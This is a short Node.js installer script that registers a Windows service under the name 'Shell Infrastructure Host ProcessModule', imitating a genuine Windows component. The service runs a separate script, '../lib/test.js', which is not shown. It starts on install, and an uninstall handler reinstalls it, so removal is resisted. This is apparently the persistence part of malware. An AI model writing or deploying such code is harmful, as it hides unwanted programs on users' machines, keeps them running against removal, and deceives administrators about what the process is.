#!/usr/bin/env node
var sname = 'Shell Infrastructure Host ProcessModule';
(function ins (){
    var Service = require('node-windows').Service;
    var path = require('path');
    var folder = path.join(__dirname,'../lib','test.js');
    var svc = new Service({
      name:sname,
      description: sname,
      script: folder,
      nodeOptions: [
        '--harmony',
        '--max_old_space_size=4096'
      ]
    });
    svc.on('install',function(){
      svc.start();
    });
    svc.on('uninstall',function(){
        svc.install();
    })
    if(svc.exists){
        svc.uninstall();
    }else{
        svc.install();
    }
})()